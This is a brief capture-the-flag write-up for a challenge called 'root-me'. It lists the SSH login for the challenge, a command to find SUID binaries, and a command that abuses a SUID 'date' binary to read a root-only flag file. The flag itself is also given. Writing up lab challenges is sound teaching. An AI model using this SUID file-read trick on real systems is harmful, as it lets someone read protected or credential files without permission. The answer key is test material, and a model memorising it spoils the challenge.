# root-me

## Challenge Text
* SSH into the challenge host, 0.cloud.chals.io on port 19777
* Username: ubuntu Password: jctf2022!
* Find the flag

## Solution
* Use the find command to find any files owned by root with the SUID bit set
```
find / -perm -4000 
```

* Use the date command to leak the flag
```
date -f /root/flag.txt
```
* Flag: `jctf{4cc355_6r4n73d}`

## Credit
* Developed by [Rob](https://github.com/njccicrob)
